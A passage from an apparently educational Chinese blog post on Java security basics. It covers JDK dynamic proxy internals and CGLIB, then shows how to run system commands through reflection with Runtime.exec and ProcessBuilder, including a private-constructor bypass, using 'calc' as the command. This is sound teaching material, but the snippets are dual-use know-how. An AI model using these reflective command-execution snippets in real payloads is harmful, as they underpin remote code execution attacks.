class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 无返回值的方法也仍然经过 invoke，返回值会被忽略</span></span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, mPerform, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- 静态初始化：通过反射拿到 Method 并缓存 ----</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里使用 Class.forName 是生成器的通用做法；等价地也可直接用 Object.class / Service.class</span></span><br><span class="line">            Class&lt;?&gt; obj = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; svc = Class.forName(<span class="string">&quot;com.example.Service&quot;</span>);</span><br><span class="line"></span><br><span class="line">            mEquals   = obj.getMethod(<span class="string">&quot;equals&quot;</span>, Object.class);</span><br><span class="line">            mToString = obj.getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">            mHashCode = obj.getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            mPerform  = svc.getMethod(<span class="string">&quot;perform&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="comment">// 反射失败时转为链接期错误，保持与生成类一致的失败语义</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$Proxy0</code> 的构造函数在 <code>Proxy.newProxyInstance</code> 创建动态代理类时调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造器：把 InvocationHandler 交给父类 Proxy 存入受保护字段 h。</span></span><br><span class="line"><span class="comment"> * 这里不声明 throws；失败会在调用阶段通过 UndeclaredThrowableException 包装。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> $Proxy0(InvocationHandler h) &#123;</span><br><span class="line">    <span class="built_in">super</span>(h);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>构造函数传入我们实现的 <code>InvocationHandler</code> 接口，该实现类直接传递给父类也就是 <code>Proxy</code> 的构造函数。在 <code>Proxy</code> 的构造函数将其保存在成员变量 <code>h</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过指定的调用处理器（通常是动态代理类的一个实例）构造一个新的 &#123;<span class="doctag">@code</span> Proxy&#125; 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> h 该代理实例的调用处理器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException 如果传入的调用处理器 &#123;<span class="doctag">@code</span> h&#125; 为 &#123;<span class="doctag">@code</span> null&#125;，将抛出该异常。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">Proxy</span><span class="params">(InvocationHandler h)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(h);  <span class="comment">// 检查传入的调用处理器是否为 null</span></span><br><span class="line">    <span class="built_in">this</span>.h = h;  <span class="comment">// 将调用处理器赋值给实例变量 h</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>$Proxy0</code> 根据我们传入的被代理类的接口动态生成了对应的方法的代理，同时还生成了一些 <code>Object</code> 的方法的代理例如 <code>equals</code>，<code>toString</code> 等。</p>
<p>以被代理接口的 <code>perform</code> 方法为例，在 <code>$Proxy0</code> 的静态代码块中会通过反射获取被代理接口的 <code>perform</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">performMethod = Class.forName(<span class="string">&quot;com.example.Service&quot;</span>).getMethod(<span class="string">&quot;perform&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>而在 <code>perform</code> 方法的实现中，<code>$Proxy0</code> 会调用前面保存的 <code>InvocationHandler</code> 的实现类 <code>h</code> 的 <code>invoke</code> 方法，并依次将代理类对象 <code>$Proxy0</code>，<code>perform</code> 方法的 <code>Method</code> 对象，调用 <code>perform</code> 方法时传入的参数依次作为参数传递给 <code>invoke</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重写 perform 方法（来自 Service 接口）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 InvocationHandler 调用目标类的 perform 方法</span></span><br><span class="line">        <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, performMethod, (Object[]) <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> ex;  <span class="comment">// 重新抛出 RuntimeException 或 Error</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);  <span class="comment">// 处理其他异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基于类的动态代理（CGLIB）"><a href="#基于类的动态代理（CGLIB）" class="headerlink" title="基于类的动态代理（CGLIB）"></a>基于类的动态代理（CGLIB）</h3><p><strong>CGLIB</strong>（Code Generation Library）是一个功能强大的字节码生成和修改库，广泛用于 Java 中动态生成代理类。它可以在运行时动态地创建一个子类并对其进行增强（如添加代理方法、拦截器等），常常用于 AOP（面向切面编程）或其他需要动态代理的场景。</p>
<p>CGLIB 通过动态生成子类来实现代理功能。它不像 JDK 动态代理那样要求目标类实现接口，而是通过继承目标类来生成代理类。</p>
<p>另外 CGLIB 是基于字节码操作在运行时动态生成代理类，因此相比于传统的反射机制，它的性能更高。</p>
<p>CGLIB 动态代理的应用过程如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Service is doing something.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CGLibExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 Enhancer 对象</span></span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        <span class="comment">// 设置目标类</span></span><br><span class="line">        enhancer.setSuperclass(Service.class);</span><br><span class="line">        <span class="comment">// 设置回调函数（拦截器）</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">MethodInterceptor</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object obj, java.lang.reflect.Method method, Object[] args,</span></span><br><span class="line"><span class="params">                                    MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Before method call&quot;</span>);</span><br><span class="line">                <span class="comment">// 调用目标类的方法</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proxy.invokeSuper(obj, args);</span><br><span class="line">                System.out.println(<span class="string">&quot;After method call&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理类实例</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">proxy</span> <span class="operator">=</span> (Service) enhancer.create();</span><br><span class="line">        <span class="comment">// 调用代理类方法</span></span><br><span class="line">        proxy.doSomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们需要在 Maven 中引入 cglib：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>另外如果想看 CGLIB 动态生成的代理类的实现可以添加如下设置：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="string">&quot;output/&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="反射执行命令"><a href="#反射执行命令" class="headerlink" title="反射执行命令"></a>反射执行命令</h2><p>在 Java 中，我们可以使用 <code>Runtime.getRuntime()</code> 和 <code>ProcessBuilder</code> 来执行外部命令（例如操作系统命令或运行其他程序）。</p>
<h3 id="getRuntime"><a href="#getRuntime" class="headerlink" title="getRuntime"></a>getRuntime</h3><p><code>java.lang.Runtime</code> 是一个与 Java 虚拟机（JVM）交互的接口，它提供了一些方法来执行外部命令和管理系统资源。其中 <code>exec</code> 方法是执行外部命令的主要方法。它会启动一个新的进程来执行指定的命令。</p>
<p><code>java.lang.Runtime</code> 执行命令需要先获取 <code>Runtime</code> 对象。由于 <code>Runtime</code> 是单例模式，因此需要调用 <code>Runtime</code> 的 <code>getRuntime</code> 方法来获取。之后调用 <code>Runtime</code> 对象的 <code>exec</code> 方法执行命令。对应 <code>java</code> 语句如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>改写成反射形式如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(</span><br><span class="line">                <span class="literal">null</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;calc&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>当然，也可以使用 <code>getDeclaredConstructor</code> 获取 <code>Runtime</code> 的私有构造来创建 <code>Runtime</code> 实例。不过高版本 JDK 调用私有构造类需要绕过。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; runtimeConstructor = runtimeClass.getDeclaredConstructor();</span><br><span class="line">setFieldValue(runtimeConstructor,<span class="string">&quot;modifiers&quot;</span>, Modifier.PUBLIC);</span><br><span class="line">runtimeConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> runtimeConstructor.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtimeInstance, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><p><code>java.lang.ProcessBuilder</code> 是 Java 中用于创建和管理操作系统进程的一个类，我们可以用来执行命令。对应 <code>java</code> 语句如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc&quot;</span>)).start();</span><br></pre></td></tr></table></figure></div>

<p>改写成反射形式如下，其中 <code>ProcessBuilder</code> 的构造函数参数是可变参数，因此需要传入 <code>List</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getMethod(<span class="string">&quot;start&quot;</span>).invoke(</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructor(String[].class).newInstance(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java 安全基础</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-11 23:50:14</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-28 12:50:31
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/11/Java 安全基础/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/11/Java%20Web%20%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java Web 开发基础</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">SQL 注入基础</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java 安全基础</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JDK%EF%BC%88Java-Development-Kit%EF%BC%89"><span class="nav-text">JDK（Java Development Kit）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK-%E7%9A%84%E7%BB%84%E6%88%90"><span class="nav-text">JDK 的组成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JRE%EF%BC%88Java-Runtime-Environment%EF%BC%89"><span class="nav-text">JRE（Java Runtime Environment）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88JVM%EF%BC%89"><span class="nav-text">Java 虚拟机（JVM）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E6%A0%B8%E5%BF%83%E7%B1%BB%E5%BA%93%EF%BC%88Java-Core-Libraries%EF%BC%89"><span class="nav-text">Java 核心类库（Java Core Libraries）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%8E%A5%E5%8F%A3%EF%BC%88JNI%EF%BC%89"><span class="nav-text">本地接口（JNI）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88ClassLoader%EF%BC%89"><span class="nav-text">Java 类加载器（ClassLoader）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%EF%BC%88Java-Development-Tools%EF%BC%89"><span class="nav-text">Java 开发工具（Java Development Tools）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%88javac%EF%BC%89"><span class="nav-text">Java 编译器（javac）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java-%E5%BD%92%E6%A1%A3%E5%B7%A5%E5%85%B7%EF%BC%88jar%EF%BC%89"><span class="nav-text">java 归档工具（jar）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E8%BF%90%E8%A1%8C%E5%B7%A5%E5%85%B7%EF%BC%88java%EF%BC%89"><span class="nav-text">Java 运行工具（java）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK-%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-text">JDK 的版本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81-JDK-%E5%8F%91%E8%A1%8C%E7%89%88"><span class="nav-text">常见 JDK 发行版</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-JDK"><span class="nav-text">Oracle JDK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OpenJDK"><span class="nav-text">OpenJDK</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK-%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%E6%BC%94%E5%8F%98"><span class="nav-text">JDK 的版本号演变</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JDK-1-x-%E9%98%B6%E6%AE%B5%EF%BC%88Java-%E7%9A%84%E6%97%A9%E6%9C%9F%E7%89%88%E6%9C%AC%EF%BC%89"><span class="nav-text">JDK 1.x 阶段（Java 的早期版本）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-x-%E9%98%B6%E6%AE%B5%EF%BC%88Java-%E8%AF%AD%E8%A8%80%E7%9A%84%E9%87%8D%E5%A4%A7%E5%8F%98%E9%9D%A9%EF%BC%89"><span class="nav-text">Java x 阶段（Java 语言的重大变革）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JDK-x-%E9%98%B6%E6%AE%B5%EF%BC%88%E7%8E%B0%E4%BB%A3%E7%9A%84-JDK-%E7%89%88%E6%9C%AC%EF%BC%89"><span class="nav-text">JDK x 阶段（现代的 JDK 版本）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-IDEA-%E4%B8%AD%E5%88%87%E6%8D%A2-JDK"><span class="nav-text">在 IDEA 中切换 JDK</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2-Java-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7"><span class="nav-text">切换 Java 开发工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2-JRE"><span class="nav-text">切换 JRE</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">Java 项目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Jar-%E5%8C%85%E8%BF%98%E5%8E%9F-Java-%E9%A1%B9%E7%9B%AE"><span class="nav-text">Jar 包还原 Java 项目</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">Java 字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90"><span class="nav-text">字节码动态生成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-ClassPool-%E5%AE%9E%E4%BE%8B"><span class="nav-text">获取 ClassPool 实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E7%B1%BB"><span class="nav-text">创建一个新的类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%91%E7%B1%BB%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%B1%9E%E6%80%A7"><span class="nav-text">向类中添加属性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%AD%97%E6%AE%B5"><span class="nav-text">创建字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%96%B9%E6%B3%95"><span class="nav-text">创建方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="nav-text">创建构造方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">生成字节码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9"><span class="nav-text">字节码动态修改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">获取指定类的字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E8%8E%B7%E5%8F%96%E7%B1%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">代码中获取类的字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%E7%9A%84%E7%B1%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">获取动态生成的类的字节码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="nav-text">类加载机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-text">类加载的过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%EF%BC%88Loading%EF%BC%89"><span class="nav-text">加载（Loading）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 